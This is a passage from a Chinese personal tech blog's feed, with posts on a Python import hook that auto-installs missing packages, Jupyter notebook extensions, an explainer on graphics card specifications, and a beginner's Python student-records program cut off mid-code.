class="hljs-number">0</span>:</span><br><span class="line">                        <span class="hljs-keyword">return</span> import_module(name)</span><br><span class="line">                <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:</span><br><span class="line">                    print(<span class="hljs-string">"Failed"</span>, e)</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span></span><br><span class="line"></span><br><span class="line">sys.meta_path.append(AutoInstall)</span><br></pre></td></tr></table></figure><p>Python 3 的 import 机制在查找过程中，大致顺序如下：</p><ul><li>在 sys.modules 中查找，它缓存了所有已导入的模块</li><li>在 sys.meta_path 中查找，它支持自定义的加载器</li><li>在 sys.path 中查找，它记录了一些库所在的目录名</li><li>若未找到，抛出ImportError异常</li></ul><p>其中要注意，sys.meta_path 在不同的 Python 版本中有所差异，比如它在 Python 2 与 Python 3 中差异很大；在较新的 Python 3 版本（3.4+）中，自定义的加载器需要实现find_spec方法，而早期的版本用的则是find_module。</p><p>以上代码是一个自定义的类库加载器 AutoInstall，可以实现自动导入三方库的目的。<strong>需要说明一下，这种方法会“劫持”所有新导入的库，破坏原有的导入方式，因此也可能出现一些奇奇怪怪的问题，敬请留意</strong>。</p><p>sys.meta_path 属于 <strong>Python 探针</strong> 的一种运用。探针，即import hook，是 Python 几乎不受人关注的机制，但它可以做很多事，例如加载网络上的库、在导入模块时对模块进行修改、自动安装缺失库、上传审计信息、延迟加载等等。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在写 Python 项目的时候，我们可能经常会遇到导入模块失败的错误：&lt;/p&gt;
&lt;figure class=&quot;highlight html hljs&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;ImportError: No module named &#39;xxx&#39;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;或者&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ModuleNotFoundError: No module named &#39;xxx&#39;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="Python" scheme="http://yoursite.com/categories/Python/"/>
    
    
      <category term="导库" scheme="http://yoursite.com/tags/%E5%AF%BC%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>jupyter拓展功能</title>
    <link href="http://yoursite.com/2019/10/29/jupyter%E6%8B%93%E5%B1%95%E5%8A%9F%E8%83%BD/"/>
    <id>http://yoursite.com/2019/10/29/jupyter拓展功能/</id>
    <published>2019-10-28T22:52:14.000Z</published>
    <updated>2019-10-28T23:09:30.687Z</updated>
    
    <content type="html"><![CDATA[<p>之前我曾经在我的笔记-<a href="https://zzdproject.netlify.com/#/jupyter" target="_blank" rel="noopener">JUpyter使用方法</a> 中谈到多种jupyter的使用方法，但是这几天我又发现了一些新的拓展功能，所以特意总结在这篇文章里。</p><a id="more"></a><p>目录：</p><ol><li>Pandas Profiling</li><li>使用Cufflinks和Plotly绘制Pandas数据</li><li>Jupyter 中的格式编排</li><li>在 Jupyter（或 IPython）中使一个单元同时有多个输出</li><li>为 Jupyter Notebook 即时创建幻灯片</li></ol><h2 id="1-Pandas-Profiling"><a href="#1-Pandas-Profiling" class="headerlink" title="1.Pandas Profiling"></a>1.Pandas Profiling</h2><p>使用该工具只需安装和导入 Pandas Profiling 包。</p><p>本文不再详述这一工具，如欲了解更多，请阅读：<a href="https://towardsdatascience.com/exploring-your-data-with-just-1-line-of-python-4b35ce21a82d" target="_blank" rel="noopener">https://towardsdatascience.com/exploring-your-data-with-just-1-line-of-python-4b35ce21a82d</a></p><h2 id="2-使用Cufflinks和Plotly绘制Pandas数据"><a href="#2-使用Cufflinks和Plotly绘制Pandas数据" class="headerlink" title="2.使用Cufflinks和Plotly绘制Pandas数据"></a>2.使用Cufflinks和Plotly绘制Pandas数据</h2><p>使用python的人大多对 matplotlib 和 pandas 很熟悉。也就是说，你只需调用 .plot() 方法，即可快速绘制简单的 pd.DataFrame 或 pd.Series。</p><p>这已经很好了，不过是否可以绘制一个交互式、可缩放、可扩展的全景图呢？是时候让 Cufflinks* *出马了！（Cufflinks 基于 Plotly 做了进一步的包装。）</p><p>对于Plotly我已经发过一次教程在：<a href="https://github.com/WangRongsheng/Python-Plotly_jupyter-notebook" target="_blank" rel="noopener">Plotly教程</a></p><p>在环境中安装 Cufflinks，只需在终端中运行<strong>!pip install cufflinks –upgrade</strong> 即可。</p><p>其他更多的使用方法请参见文档</p><ul><li>Cufflinks 文档：<a href="https://plot.ly/ipython-notebooks/cufflinks/" target="_blank" rel="noopener">https://plot.ly/ipython-notebooks/cufflinks/</a></li><li>Plotly 文档：<a href="https://plot.ly/" target="_blank" rel="noopener">https://plot.ly/</a></li></ul><h2 id="3-Jupyter-中的格式编排"><a href="#3-Jupyter-中的格式编排" class="headerlink" title="3.Jupyter 中的格式编排"></a>3.Jupyter 中的格式编排</h2><p>一些常用的格式：</p><p>（1）蓝色、时尚：</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"alert alert-block alert-info"</span>&gt;</span></span><br><span class="line">  This is <span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>fancy<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span>!</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>（2）红色、轻微慌张：</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"alert alert-block alert-danger"</span>&gt;</span> </span><br><span class="line">  This is <span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>baaaaad<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span>!</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>（3）绿色、平静：</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"alert alert-block alert-success"</span>&gt;</span></span><br><span class="line"> This is <span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>gooood<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span>!</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果：</p><center><a href="https://sm.ms/image/vhqEeZ6yo1bJniS" target="_blank"><img src="https://i.loli.net/2019/10/29/vhqEeZ6yo1bJniS.gif"></a></center><h2 id="4-在-Jupyter（或-IPython）中使一个单元同时有多个输出"><a href="#4-在-Jupyter（或-IPython）中使一个单元同时有多个输出" class="headerlink" title="4.在 Jupyter（或 IPython）中使一个单元同时有多个输出"></a>4.在 Jupyter（或 IPython）中使一个单元同时有多个输出</h2><p>想展示 pandas DataFrame 的 .head() 和 .tail()，但由于创建运行 .tail() 方法的额外代码单元过于麻烦而不得不中途放弃，你是否有过这样的经历？现在不用怕了，你可以使用以下代码行展示你想展示的输出：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> IPython.core.interactiveshell <span class="hljs-keyword">import</span> InteractiveShell</span><br><span class="line">InteractiveShell.ast_node_interactivity = <span class="hljs-string">"all"</span></span><br></pre></td></tr></table></figure><h2 id="5-为-Jupyter-Notebook-即时创建幻灯片"><a href="#5-为-Jupyter-Notebook-即时创建幻灯片" class="headerlink" title="5.为 Jupyter Notebook 即时创建幻灯片"></a>5.为 Jupyter Notebook 即时创建幻灯片</h2><p>使用<strong>RISE</strong> ，你可以仅通过一次按键将 Jupyter Notebook 即时转变为幻灯片。而且 notebook 仍然处于活跃状态，你可以在展示幻灯片的同时执行实时编码！</p><p>要想使用该工具，你只需通过 conda 或 pip 安装 RISE 即可。</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">conda install -c conda-forge rise</span><br><span class="line">或者</span><br><span class="line">pip install RISE</span><br></pre></td></tr></table></figure><p>现在，你可以点击新按钮，为 notebook 创建不错的幻灯片了：</p><p><a href="https://sm.ms/image/WJejhYXlLkZzPFp" target="_blank"><img src="https://i.loli.net/2019/10/29/WJejhYXlLkZzPFp.jpg"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;之前我曾经在我的笔记-&lt;a href=&quot;https://zzdproject.netlify.com/#/jupyter&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;JUpyter使用方法&lt;/a&gt; 中谈到多种jupyter的使用方法，但是这几天我又发现了一些新的拓展功能，所以特意总结在这篇文章里。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Python" scheme="http://yoursite.com/categories/Python/"/>
    
    
      <category term="Jupyter拓展" scheme="http://yoursite.com/tags/Jupyter%E6%8B%93%E5%B1%95/"/>
    
  </entry>
  
  <entry>
    <title>关于显卡</title>
    <link href="http://yoursite.com/2019/10/28/%E5%85%B3%E4%BA%8E%E6%98%BE%E5%8D%A1/"/>
    <id>http://yoursite.com/2019/10/28/关于显卡/</id>
    <published>2019-10-27T23:07:50.000Z</published>
    <updated>2019-10-27T23:57:00.115Z</updated>
    
    <content type="html"><![CDATA[<p>为了便于理解，全文形象化介绍。</p><a id="more"></a><p>首先，<strong>显卡是电脑上绘制图像的东西</strong>，我们所看到的图像都是显卡<strong>一张一张</strong>“画”出来的，然后通过高速连续的播放，形成了我们看到的连贯图像。</p><h2 id="显卡性能的关键参数"><a href="#显卡性能的关键参数" class="headerlink" title="显卡性能的关键参数"></a>显卡性能的关键参数</h2><p>（1）流处理器数量（CUDA核心）</p><p>可以理解为人类世界的“画师”。比如：</p><p><a href="https://sm.ms/image/pKGzfNXTUmrRwkj" target="_blank"><img src="https://i.loli.net/2019/10/28/pKGzfNXTUmrRwkj.png"></a></p><p>我们可以看到流处理器单元为1536units，相当于这个显卡为1536个“画师”。</p><p>此时我们可以知道，“画师”数量越多，画画的速度也就越快，也就是我们所说的游戏帧数高。</p><p>由此，显卡的性能优劣就可以对比出来，但是仅仅是比“画师”的数量是不够的，还要看画画的水平。</p><p>（2）显卡的架构</p><p>比如：老的麦克斯架构的GTX960显卡，与同级别但是采用帕斯卡架构的显卡中，后者是比前者性能要好的，由此我们看到，新架构的显卡的效率更高，性能更强。</p><p>我们平时利用显卡来跑深度学习程序的时候，对显卡架构来说并不用很关心，大部分关于显卡架构的工作，我们的CUDA库和所使用的深度学习库都帮我们处理了，我们平时用的GTX 1080ti、GTX 1080以及所有10系列的显卡，使用的是 <strong>Pascal 架构</strong> ，而最新出来的RTX 2080、RTX 2080ti则使用的是<strong>Turning(图灵架构)</strong> ，而之前的服务器级别显卡P100则使用的是<strong>Volta架构</strong> 。</p><p><strong>流处理器和架构是最影响显卡性能的参数。</strong></p><p>（3）显卡的核心频率</p><p>这里我们可以理解为“画师”的画画速度。</p><p>在相同的流处理器和架构情况下，显卡的核心频率越高，显卡的性能也就越好。</p><p>但是我们也可以通过<strong>显卡超频（Over Clock，OC）</strong> ，也就是压榨“画师”多多来工作，去强行提升这个频率，但是要记住，<strong>超频有风险</strong>，折腾需谨慎。</p><p>（4）显存容量/位宽/频率</p><p>我们可以理解为“画师”做好了画，是需要空间<strong>存贮这些画</strong> 的。</p><ul><li><p>显存位宽：表示小车将画从“画师”那里运送到仓库的数据大小，一般为128-bit或者64-bit。</p></li><li><p>显存频率：表示小车每秒能运输多少次。</p></li><li><p>显存容量：表示仓库的大小。</p></li></ul><p><a href="https://sm.ms/image/vFH7p1wlbUG3yNk" target="_blank"><img src="https://i.loli.net/2019/10/28/vFH7p1wlbUG3yNk.png"></a></p><h2 id="公版显卡与非公版显卡"><a href="#公版显卡与非公版显卡" class="headerlink" title="公版显卡与非公版显卡"></a>公版显卡与非公版显卡</h2><ul><li><p>公版显卡：显卡研发厂家（英伟达或者AMD）官方出售的显卡，以稳定著称。</p></li><li><p>非公版显卡：各大品牌厂家购买官方的显卡芯片后进行自己组装拼凑出来的显卡。</p></li></ul><p>常见情况下我们所使用和购买的显卡都为非公版显卡。</p><h2 id="N卡-A卡-买哪个？"><a href="#N卡-A卡-买哪个？" class="headerlink" title="N卡/A卡/买哪个？"></a>N卡/A卡/买哪个？</h2><ul><li><p>N卡是英伟达芯片的显卡。</p></li><li><p>A卡是AMD芯片的显卡。</p></li></ul><p>如今N卡与A卡在游戏上的区别并不是很大，但是很多游戏的话对N卡的优化比较好，所以<strong>买就买N卡</strong>吧。</p><p>下面给出一个显卡性能的天梯图（来自2019年）：</p><p><a href="https://sm.ms/image/9Kfkbr7NesaO3Gv" target="_blank"><img src="https://i.loli.net/2019/10/28/9Kfkbr7NesaO3Gv.jpg"></a></p><p>最后推荐购买高性能显卡中的<strong>RTX 2080ti、2080</strong> （价格在1w左右），图灵架构，拥有深度学习超采样技术和光线追踪两大黑科技。</p><p>但是相比之下，华硕ROG GTX1060 6GB猛禽、华硕 GTX1060 6G雪豹、索泰 GTX1060 6G至尊更适合我们这种低端玩家（俗称穷鬼），其性价比是不错的。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;为了便于理解，全文形象化介绍。&lt;/p&gt;
    
    </summary>
    
    
      <category term="杂谈" scheme="http://yoursite.com/categories/%E6%9D%82%E8%B0%88/"/>
    
    
      <category term="显卡" scheme="http://yoursite.com/tags/%E6%98%BE%E5%8D%A1/"/>
    
  </entry>
  
  <entry>
    <title>学生信息管理系统（python语言）</title>
    <link href="http://yoursite.com/2019/10/27/%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%EF%BC%88python%E8%AF%AD%E8%A8%80%EF%BC%89/"/>
    <id>http://yoursite.com/2019/10/27/学生信息管理系统（python语言）/</id>
    <published>2019-10-27T10:06:03.000Z</published>
    <updated>2019-10-27T10:11:05.670Z</updated>
    
    <content type="html"><![CDATA[<p>本程序包含main.py和gro.py两个函数<br>可以使用<strong>python main.py</strong> 直接运行！</p><a id="more"></a><p>主函数：main.py</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> gro <span class="hljs-keyword">import</span> gro</span><br><span class="line"><span class="hljs-keyword">import</span> pickle <span class="hljs-keyword">as</span> pk</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">printMenu</span><span class="hljs-params">()</span>:</span></span><br><span class="line">        print(<span class="hljs-string">"="</span> * <span class="hljs-number">30</span>)</span><br><span class="line">        print(<span class="hljs-string">"      学生管理系统"</span>)  <span class="hljs-comment"># class maked</span></span><br><span class="line">        print(<span class="hljs-string">"1.添加学生信息"</span>)</span><br><span class="line">        print(<span class="hljs-string">"2.删除学生信息"</span>)</span><br><span class="line">        print(<span class="hljs-string">"3.修改学生信息"</span>)</span><br><span class="line">        print(<span class="hljs-string">"4.查询学生信息"</span>)</span><br><span class="line">        print(<span class="hljs-string">"5.显示所有学生信息"</span>)</span><br><span class="line">        print(<span class="hljs-string">"6.导出外部文件"</span>)</span><br><span class="line">        <span class="hljs-comment">#print("7.导入外部文件")</span></span><br><span class="line">        print(<span class="hljs-string">"7.导出外部文件并加密"</span>)</span><br><span class="line">        <span class="hljs-comment">#print("9.导入外部加密文件并解读")</span></span><br><span class="line">        print(<span class="hljs-string">"0.退出系统"</span>)</span><br><span class="line">        print(<span class="hljs-string">"="</span> * <span class="hljs-number">30</span>)</span><br><span class="line"></span><br><span class="line">    CS1 = gro()</span><br><span class="line">    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:</span><br><span class="line">        <span class="hljs-comment"># 打印提示信息</span></span><br><span class="line">        printMenu()</span><br><span class="line">        key = input(<span class="hljs-string">"请输入你要选择的操作："</span>)</span><br><span class="line">        <span class="hljs-keyword">if</span> key == <span class="hljs-string">'0'</span>:</span><br><span class="line">            exit()</span><br><span class="line">        <span class="hljs-keyword">if</span> key == <span class="hljs-string">'1'</span>:</span><br><span class="line">            <span class="hljs-comment"># 添加学生信息</span></span><br><span class="line">            CS1.addstu_in()</span><br><span class="line">        <span class="hljs-keyword">elif</span> key == <span class="hljs-string">'2'</span>:</span><br><span class="line">            CS1.del_itemin()</span><br><span class="line">            <span class="hljs-comment"># 删除学生信息</span></span><br><span class="line">        <span class="hljs-keyword">elif</span> key == <span class="hljs-string">'3'</span>:</span><br><span class="line">            CS1.modifystu()</span><br><span class="line">            <span class="hljs-comment"># 修改学生信息</span></span><br><span class="line">            <span class="hljs-comment"># modifystu</span></span><br><span class="line">        <span class="hljs-keyword">elif</span> key == <span class="hljs-string">'4'</span>:</span><br><span class="line">            CS1.sc_stu()</span><br><span class="line">            <span class="hljs-comment"># 查询学生信息</span></span><br><span class="line">            <span class="hljs-comment"># sc_stu</span></span><br><span class="line">        <span class="hljs-keyword">elif</span> key == <span class="hljs-string">'5'</span>:</span><br><span class="line">            print(<span class="hljs-string">"="</span> * <span class="hljs-number">30</span>)</span><br><span class="line">            print(<span class="hljs-string">"学生的信息如下："</span>)</span><br><span class="line">            print(<span class="hljs-string">"序号  学号  姓名            成绩  "</span>)</span><br><span class="line">            i = <span class="hljs-number">0</span></span><br><span class="line">            <span class="hljs-keyword">for</span> tempInfo <span class="hljs-keyword">in</span> CS1.allstu:</span><br><span class="line">                print(<span class="hljs-string">"%d     %s     %s      %s"</span></span><br><span class="line">                      % (i + <span class="hljs-number">1</span>, CS1.allstu[i].get(<span class="hljs-string">'stuid'</span>), CS1.allstu[i].get(<span class="hljs-string">'stuname'</span>),CS1.allstu[i].get(<span class="hljs-string">'score'</span>)))</span><br><span class="line">                i += <span class="hljs-number">1</span></span><br><span class="line">        <span class="hljs-keyword">elif</span> key == <span class="hljs-string">'6'</span>:</span><br><span class="line">            CS1.Output_txt()</span><br><span class="line">            print(<span class="hljs-string">"="</span> * <span class="hljs-number">30</span>)</span><br><span class="line">            print(<span class="hljs-string">"外部文件已导出..."</span>)</span><br><span class="line">            <span class="hljs-comment"># Output_txt</span></span><br><span class="line">        <span class="hljs-keyword">elif</span> key == <span class="hljs-string">'7'</span>:</span><br><span class="line">            CS1.Input_txt()</span><br><span class="line">            print(<span class="hljs-string">"="</span> * <span class="hljs-number">30</span>)</span><br><span class="line">            <span class="hljs-comment"># Input_txt</span></span><br><span class="line">            print(<span class="hljs-string">"外部文件数据已导入..."</span>)</span><br><span class="line">        <span class="hljs-keyword">elif</span> key == <span class="hljs-string">'8'</span>:</span><br><span class="line">            <span class="hljs-keyword">pass</span></span><br><span class="line">            print(<span class="hljs-string">"="</span> * <span class="hljs-number">30</span>)</span><br><span class="line">            <span class="hljs-comment"># Output_txt_s(stu_collection)</span></span><br><span class="line">            print(<span class="hljs-string">"外部加密文件已导出..."</span>)</span><br><span class="line">        <span class="hljs-keyword">elif</span> key == <span class="hljs-string">'9'</span>:</span><br><span class="line">            <span class="hljs-keyword">pass</span></span><br><span class="line">            print(<span class="hljs-string">"="</span> * <span class="hljs-number">30</span>)</span><br><span class="line">            <span class="hljs-comment"># Input_txt_s(stu_collection)</span></span><br><span class="line">            print(<span class="hljs-string">"外部文件数据已解读..."</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>子函数：gro.py</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">stu</span>:</span></span><br><span class="line">    stuid = <span class="hljs-string">"001"</span>;</span><br><span class="line">    stuname = <span class="hljs-string">"zhangsan"</span>;</span><br><span class="line">    score = <span class="hljs-number">80</span>;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">printstu</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">        print(self.stuid)</span><br><span class="line">        print(self.stuname)</span><br><span class="line">        print(self.score)</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">savestudent</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">        exmaple = &#123;<span class="hljs-string">'stuid'</span>: <span class="hljs-number">123</span>, <span class="hljs-string">'stuname'</span>: <span class="hljs-string">'xxx'</span>, <span class="hljs-string">'score'</span>: <span class="hljs-number">100</span>&#125;</span><br><span class="line">        temp = exmaple.fromkeys([<span class="hljs-string">'stuid'</span>, <span class="hljs-string">'stuname'</span>, <span class="hljs-string">'score'</span>])</span><br><span class="line">        temp[<span class="hljs-string">'stuid'</span>] = self.stuid</span><br><span class="line">        temp[<span class="hljs-string">'stuname'</span>] = self.stuname</span><br><span class="line">        temp[<span class="hljs-string">'score'</span>] = self.score</span><br><span class="line">        <span class="hljs-keyword">return</span> temp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gro</span>:</span></span><br><span class="line">    allstu = []</span><br><span class="line">    groname = <span class="hljs-string">'CS1'</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">inputstu</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">        newstu = stu()</span><br><span class="line">        newstu.stuid = int(input(<span class="hljs-string">"请输入学号:\n"</span>))</span><br><span class="line">        newstu.stuname = input(<span class="hljs-string">"请输入学生姓名:\n"</span>)</span><br><span class="line">        newstu.score = int(input(<span class="hljs-string">"请输入成绩:\n"</span>))</span><br><span class="line">        newstu.savestudent()</span><br><span class="line">        <span class="hljs-keyword">return</span> newstu.savestudent()</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">addstu</span><span class="hljs-params">(self, stuobj)</span>:</span></span><br><span class="line">        self.allstu.append(stuobj)</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">addstu_in</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">        allnew = self.inputstu()</span><br><span class="line">        self.addstu(allnew)</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">del_itemin</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">        length = len(self.allstu)</span><br><span class="line">        <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> range(length):</span><br><span class="line">            <span class="hljs-keyword">if</span> self.allstu[s][<span class="hljs-string">'stuid'</span>] == int(input(<span class="hljs-string">"输入删除学生的学号:\n"</span>)):</span><br><span class="line">                self.allstu.pop(s)</span><br><span class="line">            <span class="hljs-keyword">else</span>:</span><br><span class="line">                print(<span class="hljs-string">"没有此学生相关信息!\n"</span>)</span><br><span class="line">                <span class="hljs-keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">modifystu</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">        length = len(self.allstu)</span><br><span class="line">        <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> range(length):</span><br><span class="line">            <span class="hljs-keyword">if</span> self.allstu[s].get(<span class="hljs-string">'stuid'</span>) == int(input(<span class="hljs-string">"输入修改的学生学号:\n"</span>)):</span><br><span class="line">                self.allstu[s][<span class="hljs-string">'stuname'</span>] = input(<span class="hljs-string">"请输入预修改值(姓名):\n"</span>)</span><br><span class="line">                self.allstu[s][<span class="hljs-string">'score'</span>] = int(input(<span class="hljs-string">"请输入预修改值(成绩):\n"</span>))</span><br><span class="line">                print(<span class="hljs-string">"已修改!\n"</span>)</span><br><span class="line">            <span class="hljs-keyword">else</span>:</span><br><span class="line">                print(<span class="hljs-string">"没有此学生相关信息!"</span>)</span><br><span class="line">                <span class="hljs-keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">printallstu</span><span class="hljs-params">(self)</span>:</span>  <span class="hljs-comment"># 未使用</span></span><br><span class="line">        <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> self.allstu:</span><br><span class="line">            s.printstu()</span><br><span class="line">            print(<span class="hljs-string">"-"</span> * <span class="hljs-number">20</span>)</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sc_stu</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">        length = len(self.allstu)</span><br><span class="line">        <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> range(length):</span><br><span class="line">            <span class="hljs-keyword">if</span> self.allstu[s].get(<span class="hljs-string">'stuid'</span>) == int(input(<span class="hljs-string">"输入查询的学生学号:\n"</span>)):</span><br><span class="line">                print(str(self.allstu[s].get(<span 